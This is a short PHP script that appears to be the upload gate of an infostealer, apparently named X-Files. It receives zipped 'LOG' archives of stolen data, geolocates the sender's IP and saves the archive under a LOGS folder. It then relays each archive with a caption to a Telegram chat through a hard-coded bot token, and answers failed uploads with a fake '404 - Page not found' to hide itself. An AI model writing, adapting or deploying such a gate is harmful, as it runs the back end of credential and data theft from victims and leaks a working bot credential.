<?php
$date = date("d.m.Y");
$time = date("h:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$result = file_get_contents('http://ip-api.com/json/' . $ip);
$obj = json_decode($result);
$country = $obj->country;
$city = $obj->city;


function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$stringRnd = generateRandomString(10);
if (move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['DOCUMENT_ROOT']."/LOGS/LOG-$country-$ip-$date-$time-$stringRnd.zip"))
            {
			$desc = "<b>Date: </b>: " . $date . "\n<b>Time: </b>" . $time . "\n<b>IP adress: </b>" . $ip . "\n<b>Country: </b>" . $country . ", " . $city. "\n<b> X-FILES cracked </b>";
                $url = "https://api.telegram.org/bot6531921886:AAH0D2TtT8kmLc9M4kiB_0-sFWsE-6ujnDU/sendDocument";
                $document = new CURLFile($_SERVER['DOCUMENT_ROOT']."/LOGS/LOG-$country-$ip-$date-$time-$stringRnd.zip");
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $_GET["Chatid"], "document" => $document, "caption" => $desc, "parse_mode" => HTML]);
                curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $out = curl_exec($ch);
                curl_close($ch);
            }
else
{
	echo "404 - Page not found";
}
?>